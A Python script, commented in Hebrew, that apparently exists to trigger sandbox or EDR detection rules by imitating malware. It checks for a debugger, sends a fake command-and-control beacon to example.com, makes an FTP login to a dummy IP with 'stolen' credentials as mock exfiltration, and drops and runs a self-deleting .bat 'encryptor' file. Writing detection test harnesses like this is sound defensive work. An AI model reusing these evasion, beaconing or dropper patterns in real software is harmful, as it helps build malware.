import os
import time
import ctypes
import urllib.request
import subprocess
import ftplib

def trigger_static_analysis_rules():
    """
    מפעיל את חוקי הניתוח הסטטי (Anti-Analysis / IAT)
    """
    # קריאה מפורשת ל-API של ווינדוס כדי שהפונקציות יופיעו ב-Import Address Table
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            pass
    except:
        pass
    
    # שימוש בהשהייה (Sleep) שנוזקות משתמשות בה כדי לחמוק מ-Sandboxes
    time.sleep(2)

def trigger_dynamic_network_rules():
    """
    מפעיל את חיישני ה-Tshark בענן (DNS, HTTP, FTP)
    """
    # 1. יצירת בקשת HTTP ושאילתת DNS (מדמה C2 Beaconing)
    try:
        # פנייה לאתר אמיתי אך תמים, ה-Agent שלנו יתפוס את ה-Host ואת ה-User-Agent
        req = urllib.request.Request(
            "http://example.com/command_and_control",
            headers={'User-Agent': 'MaliciousBot/1.0'}
        )
        urllib.request.urlopen(req, timeout=3)
    except:
        pass

    # 2. הדלפת מידע ב-FTP (מדמה Data Exfiltration)
    try:
        # מנסה להתחבר לכתובת IP פיקטיבית כדי לייצר תעבורת FTP על כרטיס הרשת
        ftp = ftplib.FTP()
        ftp.connect('10.255.255.254', 21, timeout=1) 
        ftp.login('hacker', 'stolen_password_123')
        ftp.quit()
    except:
        pass

def trigger_dynamic_os_rules():
    """
    מפעיל את חיישני הליבה והקבצים בענן (File Drop & Process Creation)
    """
    # 1. זריקת קובץ סקריפט מזיק (File Drop) - חיישן מערכת הקבצים יתפוס סיומת .bat
    bat_file_path = os.path.join(os.getcwd(), "encryptor_payload.bat")
    
    try:
        with open(bat_file_path, "w") as f:
            f.write("@echo off\n")
            f.write("echo Simulating file encryption...\n")
            f.write("ping 127.0.0.1 -n 2 > nul\n")
            f.write("del \"%~f0\"\n") # הסקריפט מוחק את עצמו בסוף
        
        # 2. הפעלת תהליך מערכת מוסווה (Process Creation) - חיישן ה-WMI/ETW יתפוס את cmd.exe
        subprocess.Popen(["cmd.exe", "/c", bat_file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except:
        pass

if __name__ == "__main__":
    print("[!] Payload executed. Initiating advanced behaviors...")
    
    trigger_static_analysis_rules()
    trigger_dynamic_network_rules()
    trigger_dynamic_os_rules()
    
    # נותנים לתהליכי הרקע לסיים לפני שהוירוס נסגר
    time.sleep(3)
    print("[!] Operations completed.")